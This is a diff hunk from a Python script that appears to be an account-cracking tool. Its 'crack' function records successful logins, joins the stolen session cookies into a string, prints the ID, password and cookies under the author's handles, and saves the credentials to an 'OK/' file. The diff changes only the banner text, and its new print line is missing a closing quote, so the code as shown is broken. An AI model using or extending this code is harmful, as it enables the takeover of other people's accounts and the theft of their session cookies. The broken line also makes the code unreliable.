@@ -782,8 +782,8 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				raven_a = f'\r[[@bsbsjhh] @Islam85555] ➨ {idf} | {pw} | \n \n{kuki} '
-				print ('\x1b[32m――――――――――――――――――――――――')
+				raven_a = f'\r[[@bsbsjhh] @Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
+				print ('\x1b[32m――――――――――――――――――――――――)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
 				cetak(nel(statusok1, title='OK'))
